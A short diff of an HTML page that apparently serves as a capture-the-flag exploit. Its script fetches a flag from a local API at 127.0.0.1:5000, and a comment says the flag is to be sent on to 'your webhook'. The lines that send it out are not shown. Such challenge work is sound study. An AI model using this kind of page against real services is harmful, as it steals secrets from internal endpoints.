@@ -4,7 +4,7 @@
 <body>
 <h1>Loading...</h1>
 <script>
-fetch('/api/fetchflag')
+fetch('http://127.0.0.1:5000/api/fetchflag')
   .then(res => res.json())
   .then(data => {
     // Send flag to your webhook
@@ -29,4 +29,5 @@ fetch('/api/fetchflag')
   });
 </script>
 </body>
+
 </html>
